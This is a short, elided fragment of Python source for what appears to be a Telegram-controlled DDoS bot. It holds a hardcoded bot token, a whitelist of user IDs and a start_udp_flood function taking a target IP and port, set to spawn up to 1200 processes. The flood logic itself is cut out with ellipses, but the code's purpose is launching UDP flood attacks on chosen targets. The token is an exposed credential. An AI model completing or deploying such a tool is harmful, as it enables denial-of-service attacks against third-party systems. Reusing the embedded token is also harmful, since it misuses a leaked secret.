...
TOKEN = '6957481433:AAG43GLB2PTw-zbxFV8h8NllbjM40X2ErkI'
bot = telebot.TeleBot(TOKEN, threaded=False)

# 🛡️ List of authorized user IDs (replace with actual IDs)
AUTHORIZED_USERS = [1505981671]
...
def start_udp_flood(user_id, target_ip, target_port):
    ...
    # Allow up to 1200 CPU threads for maximum performance
    for _ in range(min(1200, multiprocessing.cpu_count())):
